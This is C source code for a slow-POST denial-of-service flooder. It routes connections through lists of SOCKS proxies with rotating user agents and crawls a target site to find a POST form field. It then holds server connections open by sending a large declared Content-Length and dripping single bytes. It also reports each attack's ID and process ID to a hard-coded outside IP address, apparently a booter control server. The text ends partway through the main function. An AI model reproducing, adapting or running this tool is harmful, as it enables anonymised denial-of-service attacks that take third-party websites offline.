#include <pthread.h>
#include <sys/resource.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <netinet/in.h>
#include <ctype.h>
char *useragents[] = {
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
	"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
	"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
};
#define ATTACKPORT 80
char *postformat = "POST /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: #useragent#\r\nConnection: close\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: #contentlen#\r\n\r\n%s=";
char *postpayload;
struct urlparts {
	char * name;
	char separator[4];
	char value[128];
} parts[] = {
	{ "scheme", ":" },
	{ "userid", "@" },
	{ "password", ":" },
	{ "host", "//" },
	{ "port", ":" },
	{ "path", "/" },
	{ "param", ";" },
	{ "query", "?" },
	{ "fragment", "#" }
};
enum partnames { scheme = 0, userid, password, host, port, path, param, query, fragment } ;
#define NUMPARTS (sizeof parts / sizeof (struct urlparts))
struct urlparts *returnparts[8];
struct urllist { char *url; int done; struct urllist *next; struct urllist *prev; };
struct proxy { char *type; char *ip; int port; int working; };
struct list { struct proxy *data; char *useragent; struct list *next; struct list *prev; };
struct list *head = NULL;
char parseError[128];
int parseURL(char *url, struct urlparts **returnpart);
char * strsplit(char * s, char * tok);
char firstpunc(char *s);
int strleft(char * s, int n);
void setupparts();
void freeparts();
char *stristr(const char *String, const char *Pattern);
char *str_replace(char *orig, char *rep, char *with);
char *geturl(char *url, char *useragent, char *ip);
char *ipstr;

void *flood(void *par) {
	struct list *startpoint = (struct list *)par;
	int i;
	struct sockaddr_in serverAddr;
	signal(SIGPIPE, SIG_IGN);
	while(1)
	{
		int sent = 0;
		if(startpoint->data->working == 0)
		{
			startpoint = startpoint->next;
			sleep(1);
			continue;
		}
		memset(&serverAddr, 0, sizeof(serverAddr));
		serverAddr.sin_family = AF_INET;
		serverAddr.sin_port = htons(startpoint->data->port);
		serverAddr.sin_addr.s_addr = inet_addr(startpoint->data->ip);
		int serverSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		u_int yes=1;
		if (setsockopt(serverSocket,SOL_SOCKET,SO_REUSEADDR,&yes,sizeof(yes)) < 0) {}
		if(connect(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) > 0)
		{
			startpoint->data->working = 0;
			startpoint = startpoint->next;
			continue;
		}
		if(strcmp(startpoint->data->type, "Socks4")==0)
		{
			unsigned char buf[10];
			buf[0] = 0x04;
			buf[1] = 0x01;
			*(unsigned short*)&buf[2] = htons(ATTACKPORT);
			*(unsigned long*)&buf[4] = inet_addr(ipstr);
			buf[8] = 0x00;
			if(send(serverSocket, buf, 9, MSG_NOSIGNAL) != 9)
			{
				startpoint->data->working = 0;
				startpoint = startpoint->next;
				close(serverSocket);
				continue;
			}
		}
		if(strcmp(startpoint->data->type, "Socks5")==0)
		{
			unsigned char buf[20];
			buf[0] = 0x05;
			buf[1] = 0x01;
			buf[2] = 0x00;
			if((sent = send(serverSocket, buf, 3, MSG_NOSIGNAL)) < 0)
			{
				startpoint->data->working = 0;
				startpoint = startpoint->next;
				close(serverSocket);
				continue;
			}
			buf[0] = 0x05;
			buf[1] = 0x01;
			buf[2] = 0x00;
			buf[3] = 0x01;
			*(unsigned long*)&buf[4] = inet_addr(ipstr);
			*(unsigned short*)&buf[8] = htons(ATTACKPORT);
			if((sent = send(serverSocket, buf, 10, MSG_NOSIGNAL)) < 0)
			{
				printf("BAD PROXY ONLY SENT %d:%d\n", sent, 10);
				perror("send 10");
				startpoint->data->working = 0;
				startpoint = startpoint->next;
				close(serverSocket);
				continue;
			}
		}
		char *length = (char *)malloc(255);
		sprintf(length, "%d", ((rand() % 10000) + 20000));
		char *httppartpayload = str_replace(postpayload, "#useragent#", startpoint->useragent);
		char *httppayload = str_replace(httppartpayload, "#contentlen#", length);
		free(httppartpayload);
		if(httppayload == NULL)
		{
			startpoint = startpoint->next;
			close(serverSocket);
			continue;
		}
		sent = send(serverSocket, httppayload, strlen(httppayload), MSG_NOSIGNAL);
		//printf("sent main payload %d\n", sent);
		free(httppayload);
		//char *postshit = "Z";
		//while(send(serverSocket, postshit, 1, MSG_NOSIGNAL) > 0)
	//	{
	//		sleep(1);
			//printf(".");
	//	}
		int success;
		do
		{
			char postshit = rand() % 97 + 26;
			success = send(serverSocket, &postshit, 1, MSG_NOSIGNAL);
			sleep(rand() % 3 + 1);
			//printf(".");
		} while (success > 0);
		close(serverSocket);
		usleep(30000);
		//startpoint = startpoint->next;
	}
}

int fnAttackInformation(int attackID)
{
	char szRecvBuff[1024];
	char packet[1024];
	char ip[] = "37.221.170.5";

	snprintf(packet, sizeof(packet) - 1, "GET /~dqyefldi/response.php?auth=tru&id=%d&pro=%d HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-cache\r\nOrigin: http://google.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\r\nAccept-charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n", attackID, getpid(), ip);

	struct sockaddr_in *remote;
	int sock;
	int tmpres;
	
 
	if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
	{
		perror("Can't create TCP socket");
		exit(1);
	}
	
	remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
	remote->sin_family = AF_INET;
	tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr)));
	
	if (tmpres < 0)  
	{
		perror("Can't set remote->sin_addr.s_addr");
		exit(1);
	}
	else if (tmpres == 0)
	{
		fprintf(stderr, "%s is not a valid IP address\n", ip);
		exit(1);
	}
	
	remote->sin_port = htons(80);
	
	if (connect(sock, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0)
	{
		perror("Could not connect");
		exit(1);
	}
		
	tmpres = send(sock, packet, strlen(packet), 0);
	
	//printf("Sent %d bytes -> \n%s\n\n\n", tmpres, packet);	
	
	if (tmpres == -1){
		perror("Can't send query");
		exit(1);
	}

	int i = 1;
	int dwTotal = 0;


	while (1)
	{
		i = recv(sock, szRecvBuff + dwTotal, sizeof(szRecvBuff) - dwTotal, 0);
		//printf("Received %d bytes\n", i);
		if (i <= 0)
			break;
			
		dwTotal += i;
	}

	szRecvBuff[dwTotal] = '\0';
	

	//printf("Received -> \n%s\n\n", szRecvBuff);

	
	close(sock);
	
	//printf("Sent %d bytes\n", tmpres);
	
	return 0;
}

int main(int argc, char *argv[ ]) {
	if(argc < 5){
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Usage: %s <target url> <auto scrape (1 or 0)> <number threads to use> <proxy list> <time> [manual ip (0 to disable)] [manual parameter]\n", argv[0]);
		exit(-1);
	}
	//fprintf(stdout, "Setting up Sockets...\n");
	int num_threads = atoi(argv[3]);
	int scrapeit = atoi(argv[2]);
	FILE *pFile = fopen(argv[4], "rb");
	if(pFile==NULL)
	{
		perror("fopen"); exit(1);
	}
	fseek(pFile, 0, SEEK_END);
	long lSize = ftell(pFile);
	rewind(pFile);
	char *buffer = (char *)malloc(lSize*sizeof(char));
	fread(buffer, 1, lSize, pFile);
	fclose (pFile);
	int i=0;
	char *pch = (char *)strtok(buffer, ":");
	while(pch != NULL)
	{
		if(head == NULL)
		{
			head = (struct list *)malloc(sizeof(struct list));
			bzero(head, sizeof(struct list));
			head->data = (struct proxy *)malloc(sizeof(struct proxy));
			bzero(head->data, sizeof(struct proxy));
			head->data->working = 1;
			head->data->ip = malloc(strlen(pch)+1); strcpy(head->data->ip, pch);
			pch = (char *)strtok(NULL, ":");
			if(pch == NULL) exit(-1);
			head->data->port = atoi(pch);
			pch = (char *)strtok(NULL, ":");
			head->data->type = malloc(strlen(pch)+1); strcpy(head->data->type, pch);
			pch = (char *)strtok(NULL, ":");
			head->useragent = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
			head->next = head;
			head->prev = head;
		} else {
			struct list *new_node = (struct list *)malloc(sizeof(struct list));
			bzero(new_node, sizeof(struct list));
			new_node->data = (struct proxy *)malloc(sizeof(struct proxy));
			bzero(new_node->data, sizeof(struct proxy));
			new_node->data->working = 1;
			new_node->data->ip = malloc(strlen(pch)+1); strcpy(new_node->data->ip, pch);
			pch = (char *)strtok(NULL, ":");
			if(pch == NULL) break;
			new_node->data->port = atoi(pch);
			pch = (char *)strtok(NULL, ":");
			new_node->data->type = malloc(strlen(pch)+1); strcpy(new_node->data->type, pch);
			pch = (char *)strtok(NULL, ":");
			new_node->useragent = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
			new_node->prev = head;
			new_node->next = head->next;
			head->next = new_node;
		}
	}
	free(buffer);
	const rlim_t kOpenFD = 1024 + (num_threads * 2);
	struct rlimit rl;
	int result;
	rl.rlim_cur = kOpenFD;
	rl.rlim_max = kOpenFD;
	result = setrlimit(RLIMIT_NOFILE, &rl);
	if (result != 0)
	{
		perror("setrlimit");
		fprintf(stderr, "setrlimit returned result = %d\n", result);
	}
	char *parameter;
	if(argc > 7)
	{
		parameter = argv[7];
	} else {
		parameter = "username";
	}
	setupparts();
	parseURL(argv[1], returnparts);
	if(argc > 6 && !(strcmp(argv[6], "0") == 0))
	{
		ipstr = malloc(strlen(argv[6])+1);
		strcpy(ipstr, argv[6]);
		//fprintf(stdout, "Using manual IP...\n");
	} else {
		struct hostent *he;
		struct in_addr a;
		he = gethostbyname(returnparts[host]->value);
		if (he)
		{
			while (*he->h_addr_list)
			{
				bcopy(*he->h_addr_list++, (char *) &a, sizeof(a));
				ipstr = malloc(INET_ADDRSTRLEN+1);
				inet_ntop (AF_INET, &a, ipstr, INET_ADDRSTRLEN);
				break;
			}
		}
		else
		{ herror("gethostbyname"); }
	}
	char *targeturl = argv[1];
	char *targetparameter = parameter;
	if(scrapeit == 1)
	{
		char *original_domain = malloc(strlen(returnparts[host]->value)+1);
		strcpy(original_domain, returnparts[host]->value);
		freeparts();
		struct urllist *headurl = malloc(sizeof(struct urllist));
		bzero(headurl, sizeof(struct urllist));
		headurl->url = argv[1];
		headurl->done = 0;
		headurl->next = headurl;
		headurl->prev = headurl;
		int donescrape = 0;
		char *lasturl = "";
		while(headurl->done == 0)
		{
			if(headurl->url == NULL)
			{
				headurl->done = 1;
				headurl = headurl->next;
				continue;
			}
			if(strcmp(headurl->url, lasturl) == 0)
			{
				headurl->done = 1;
				headurl = headurl->next;
				continue;
			}
			lasturl = headurl->url;
			printf("Scraping: %s\n", headurl->url);
			char *buffer = geturl(headurl->url, useragents[rand() % (sizeof(useragents)/sizeof(char *))], ipstr);
			if(strstr(buffer, "\r\n\r\n")==NULL)
			{
				free(buffer);
				headurl->done = 1;
				headurl = headurl->next;
				continue;
			}
			char *headerstatus = malloc(strstr(buffer, "\r\n\r\n") - buffer + 3);
			memcpy(headerstatus, buffer, strstr(buffer, "\r\n\r\n") - buffer + 2);
			char *body = buffer + (strstr(buffer, "\r\n\r\n") - buffer + 2) + 2;
			int status = atoi(strchr(strncpy(malloc(1024),headerstatus,strstr(headerstatus, "\r\n") - headerstatus), ' ') + 1);
			char *headers = strstr(headerstatus, "\r\n")+2;
			int temp = ((status/10)/10) % 10;
			if(temp == 4)
			{
				free(headerstatus);
				free(buffer);
				headurl->done = 1;
				headurl = headurl->next;
				continue;
			}
			if(temp == 3)
			{
				char *location = stristr(headers, "Location: ") + 10;
				if(location == NULL)
				{
					free(headerstatus);
					free(buffer);
					headurl->done = 1;
					headurl = headurl->next;
					continue;
				}
				struct urllist *newurl = malloc(sizeof(struct urllist));
				bzero(newurl, sizeof(struct urllist));
				char *nexturl = malloc(strstr(location, "\r\n") - location + 1);
				bzero(nexturl, strstr(location, "\r\n") - location + 1);
				strncpy(nexturl, location, strstr(location, "\r\n") - location);
				char *parsednexturl;
				setupparts();
				parseURL(nexturl, returnparts);
				if(!(*(returnparts[path]->value)))
				{
					free(headerstatus);
					free(buffer);
					headurl->done = 1;
					headurl = headurl->next;
					continue;
				}
				if(*(returnparts[host]->value))
				{
					char *host_tmp = str_replace(returnparts[host]->value, "www.", "");
					if(host_tmp != NULL)
					{
						if(strcmp(host_tmp, original_domain) != 0)
						{
							free(headerstatus);
							free(buffer);
							headurl->done = 1;
							headurl = headurl->next;
							continue;
						} else {
							original_domain = malloc(strlen(returnparts[host]->value)+1);
							bzero(original_domain, strlen(returnparts[host]->value)+1);
							strcpy(original_domain, returnparts[host]->value);
						}
						
					} else {
						if(strcmp(returnparts[host]->value, original_domain) != 0)
						{
							free(headerstatus);
							free(buffer);
							headurl->done = 1;
							headurl = headurl->next;
							continue;
						}
					}
					
					parsednexturl = malloc(strlen(nexturl)+1);
					bzero(parsednexturl, strlen(nexturl)+1);
					strcpy(parsednexturl, nexturl);
				} else {
					parsednexturl = malloc(7 + strlen(original_domain) + 1 + strlen(returnparts[path]->value) + 1);
					bzero(parsednexturl, 7 + strlen(original_domain) + 1 + strlen(returnparts[path]->value) + 1);
					strcpy(parsednexturl, "http://");
					strcpy(parsednexturl + 7, original_domain);
					strcpy(parsednexturl + 7 + strlen(original_domain), "/");
					strcpy(parsednexturl + 7 + strlen(original_domain) + 1, returnparts[path]->value);
					char *tmp = malloc(strlen(original_domain)+2);
					bzero(tmp, strlen(original_domain)+2);
					sprintf(tmp, "%s/", original_domain);
					char *tmp2 = malloc(strlen(original_domain)+3);
					bzero(tmp2, strlen(original_domain)+3);
					sprintf(tmp2, "%s//", original_domain);
					char *parsednexturl_tmp = str_replace(parsednexturl, tmp2, tmp);
					if(parsednexturl_tmp != NULL)
					{
						free(parsednexturl);
						parsednexturl = parsednexturl_tmp;
					}
					free(tmp);
					free(tmp2);
				}
				freeparts();
				free(nexturl);
				
				newurl->url = parsednexturl;
				newurl->done = 0;
				newurl->next = headurl->next;
				newurl->prev = headurl;
				headurl->next = newurl;
				headurl->done = 1;
				headurl = headurl->next;
				free(headerstatus);
				free(buffer);
				continue;
			}
			char *formstart = body;
			while(stristr(formstart, "<form")!=NULL)
			{
				formstart = stristr(formstart, "<form")+5;
				char *formend = stristr(formstart, "</form");
				char *input = formstart;
				char *method = stristr(formstart, "method=");
				if(method == NULL || method > stristr(formstart, ">"))
				{
					continue;
				}
				char *methodstart = method+7;
				char *methodname = NULL;
				if(strchr(methodstart, '"')!=NULL && strchr(methodstart, '>') > strchr(methodstart, '"'))
				{
					methodstart = strchr(method, '"')+1;
					methodname = malloc(strchr(methodstart, '"') - methodstart + 1);
					bzero(methodname, strchr(methodstart, '"') - methodstart + 1);
					strncpy(methodname, methodstart, strchr(methodstart, '"') - methodstart);
				} else if(strchr(methodstart, '\'')!=NULL && strchr(methodstart, '>') > strchr(methodstart, '\''))
				{
					methodstart = strchr(method, '\'')+1;
					methodname = malloc(strchr(methodstart, '\'') - methodstart + 1);
					bzero(methodname, strchr(methodstart, '\'') - methodstart + 1);
					strncpy(methodname, methodstart, strchr(methodstart, '\'') - methodstart);
				} else {
					char *end = NULL;
					if(strchr(methodstart, ' ') > strchr(methodstart, '>'))
					{
						end = strchr(methodstart, '>');
					} else {
						end = strchr(methodstart, ' ');
					}
					methodname = malloc(end - methodstart + 1);
					bzero(methodname, end - methodstart + 1);
					strncpy(methodname, methodstart, end - methodstart);
				}
				int i;
				for(i=0;*(methodname + i);i++)
				{
					*(methodname + i) = toupper(*(methodname + i));
				}
				if(strcmp(methodname, "GET") == 0)
				{
					continue;
				}
				char *action = stristr(formstart, "action=");
				char *actionname = NULL;
				if(action == NULL || action > formend)
				{
					actionname = headurl->url;
				} else {
					char *actionstart = action;
					if(strchr(actionstart, '"') != NULL && strchr(actionstart, '>') > strchr(actionstart, '"'))
					{
						actionstart = strchr(action, '"')+1;
						actionname = malloc(strchr(actionstart, '"') - actionstart + 1);
						bzero(actionname, strchr(actionstart, '"') - actionstart + 1);
						strncpy(actionname, actionstart, strchr(actionstart, '"') - actionstart);
					} else if(strchr(actionstart, '\'') != NULL && strchr(actionstart, '>') > strchr(actionstart, '\''))
					{
						actionstart = strchr(action, '\'')+1;
						actionname = malloc(strchr(actionstart, '\'') - actionstart + 1);
						bzero(actionname, strchr(actionstart, '\'') - actionstart + 1);
						strncpy(actionname, actionstart, strchr(actionstart, '\'') - actionstart);
					} else {
						char *end = NULL;
						if(strchr(actionstart, ' ') > strchr(actionstart, '>'))
						{
							end = strchr(actionstart, '>');
						} else {
							end = strchr(actionstart, ' ');
						}
						actionname = malloc(end - action + 1);
						bzero(actionname, end - action + 1);
						strncpy(actionname, action, end - action);
					}
				}
				if(strcmp(actionname, "") == 0)
				{
					free(actionname);
					actionname = headurl->url;
				}
				while((input = stristr(input, "<input")) != NULL)
				{
					input = input + 6;
					char *inputname = stristr(input, "name=");
					if(inputname != NULL)
					{
						inputname = inputname+5;
						char *namestart = inputname;
						char *name;
						if(strchr(inputname, '"')!=NULL && strchr(inputname, '>') > strchr(inputname, '"'))
						{
							namestart = strchr(inputname, '"')+1;
							name = malloc(strchr(namestart, '"') - namestart + 1);
							bzero(name, strchr(namestart, '"') - namestart + 1);
							strncpy(name, namestart, strchr(namestart, '"') - namestart);
						} else if(strchr(inputname, '\'')!=NULL && strchr(inputname, '>') > strchr(inputname, '\''))
						{
							namestart = strchr(inputname, '\'')+1;
							name = malloc(strchr(namestart, '\'') - namestart + 1);
							bzero(name, strchr(namestart, '\'') - namestart + 1);
							strncpy(name, namestart, strchr(namestart, '\'') - namestart);
						} else {
							char *end = NULL;
							if(strchr(inputname, ' ') > strchr(inputname, '>'))
							{
								end = strchr(inputname, '>');
							} else {
								end = strchr(inputname, ' ');
							}
							name = malloc(end - inputname + 1);
							bzero(name, end - inputname + 1);
							strncpy(name, namestart, end - inputname);
						}
						targetparameter = name;
						setupparts();
						parseURL(actionname, returnparts);
						if(!(*(returnparts[path]->value)))
						{
							goto NOTRIGHT;
						}
						if(*(returnparts[host]->value))
						{
							if(strcmp(returnparts[host]->value, original_domain) != 0)
							{
								goto NOTRIGHT;
							}
							targeturl = actionname;
						} else {
							targeturl = malloc(7 + strlen(original_domain) + 1 + strlen(returnparts[path]->value) + 1);
							bzero(targeturl, 7 + strlen(original_domain) + 1 + strlen(returnparts[path]->value) + 1);
							strcpy(targeturl, "http://");
							strcpy(targeturl + 7, original_domain);
							strcpy(targeturl + 7 + strlen(original_domain), "/");
							strcpy(targeturl + 7 + strlen(original_domain) + 1, returnparts[path]->value);
							char *tmp = malloc(strlen(original_domain)+2);
							bzero(tmp, strlen(original_domain)+2);
							sprintf(tmp, "%s/", original_domain);
							char *tmp2 = malloc(strlen(original_domain)+3);
							bzero(tmp2, strlen(original_domain)+3);
							sprintf(tmp2, "%s//", original_domain);
							char *targeturl_tmp = str_replace(targeturl, tmp2, tmp);
							if(targeturl_tmp != NULL)
							{
								free(targeturl);
								targeturl = targeturl_tmp;
							}
							free(tmp);
							free(tmp2);
						}
						freeparts();
						free(headerstatus);
						free(buffer);
						printf("TARGET AQUIRED: %s, %s\n", targeturl, targetparameter);
						goto END;
					}
				}
NOTRIGHT:
				continue;
			}
			char *link = body;
			while((link = stristr(link, "<a ")) != NULL)
			{
				link = link+3;
				char *href = stristr(link, "href=");
				if(href == NULL || href > stristr(link, ">"))
				{
					continue;
				}
				href = href + 5;
				char *hrefstart = href;
				char *hreftarget;
				if(strchr(hrefstart, '"')!=NULL && strchr(hrefstart, '>') > strchr(hrefstart, '"'))
				{
					hrefstart = strchr(hrefstart, '"')+1;
					hreftarget = malloc(strchr(hrefstart, '"') - hrefstart + 1);
					bzero(hreftarget, strchr(hrefstart, '"') - hrefstart + 1);
					strncpy(hreftarget, hrefstart, strchr(hrefstart, '"') - hrefstart);
				} else if(strchr(hrefstart, '\'')!=NULL && strchr(hrefstart, '>') > strchr(hrefstart, '\''))
				{
					hrefstart = strchr(hrefstart, '\'')+1;
					hreftarget = malloc(strchr(hrefstart, '\'') - hrefstart + 1);
					bzero(hreftarget, strchr(hrefstart, '\'') - hrefstart + 1);
					strncpy(hreftarget, hrefstart, strchr(hrefstart, '\'') - hrefstart);
				} else {
					char *end = NULL;
					if(strchr(hrefstart, ' ') > strchr(hrefstart, '>'))
					{
						end = strchr(hrefstart, '>');
					} else {
						end = strchr(hrefstart, ' ');
					}
					hreftarget = malloc(end - hrefstart + 1);
					bzero(hreftarget, end - hrefstart + 1);
					strncpy(hreftarget, hrefstart, end - hrefstart);
				}
				if(strcmp(hreftarget, "#") == 0 || stristr(hreftarget, "javascript:") != NULL)
				{
					free(hreftarget);
					continue;
				}
				char *scrapenext;
				setupparts();
				parseURL(hreftarget, returnparts);
				if(!(*(returnparts[path]->value)))
				{
					freeparts();
					continue;
				}
				if(*(returnparts[host]->value))
				{
					if(strcmp(returnparts[host]->value, original_domain) != 0)
					{
						freeparts();
						continue;
					}
					scrapenext = hreftarget;
				} else {
					scrapenext = malloc(7 + strlen(original_domain) + 1 + strlen(returnparts[path]->value) + 1);
					bzero(scrapenext, 7 + strlen(original_domain) + 1 + strlen(returnparts[path]->value) + 1);
					strcpy(scrapenext, "http://");
					strcpy(scrapenext + 7, original_domain);
					strcpy(scrapenext + 7 + strlen(original_domain), "/");
					strcpy(scrapenext + 7 + strlen(original_domain) + 1, returnparts[path]->value);
					char *tmp = malloc(strlen(original_domain)+2);
					bzero(tmp, strlen(original_domain)+2);
					sprintf(tmp, "%s/", original_domain);
					char *tmp2 = malloc(strlen(original_domain)+3);
					bzero(tmp2, strlen(original_domain)+3);
					sprintf(tmp2, "%s//", original_domain);
					char *scrapenext_tmp = str_replace(scrapenext, tmp2, tmp);
					if(scrapenext_tmp != NULL)
					{
						free(scrapenext);
						scrapenext = scrapenext_tmp;
					}
					free(tmp);
					free(tmp2);
				}
				freeparts();
				int alreadyadded = 0;
				if(headurl->next == headurl)
				{
					if(strcmp(headurl->url, scrapenext) == 0)
					{
						alreadyadded = 1;
					}
				} else {
					struct urllist *dup = headurl->next;
					while(dup != headurl)
					{
						if(dup->url == NULL)
						{
							dup->prev->next = dup->next;
							dup->next->prev = dup->prev;
							dup = dup->next;
							continue;
						}
						if(strcmp(dup->url, scrapenext) == 0)
						{
							alreadyadded = 1;
							break;
						}
						dup = dup->next;
					}
				}
				if(alreadyadded == 0)
				{
					struct urllist *newurl = malloc(sizeof(struct urllist));
					bzero(newurl, sizeof(struct urllist));
					newurl->url = scrapenext;
					newurl->done = 0;
					newurl->next = headurl->next;
					newurl->prev = headurl;
					headurl->next = newurl;
				}
			}
			headurl->done = 1;
			headurl = headurl->next;
			free(headerstatus);
			free(buffer);
		}
END:
		free(original_domain);
	} else {
		freeparts();
	}
	setupparts();
	parseURL(targeturl, returnparts);
	pthread_t thread[num_threads];
	struct list *td[num_threads];
	struct list *node = head->next;
	
	
	for(i=0;i<num_threads;i++)
	{
		td[i] = node;
		node = node->next;
	}
	postpayload = malloc(4096);
	sprintf(postpayload, postformat, returnparts[path]->value, returnparts[host]->value, targetparameter);
	freeparts();
	
	//fprintf(stdout, "Starting Flood...\n");
	
	fnAttackInformation(atoi(argv[argc-1]));
	
	for(i = 0;i<num_threads;i++){
		pthread_create( &thread[i], NULL, &flood, (void *) td[i]);
	}
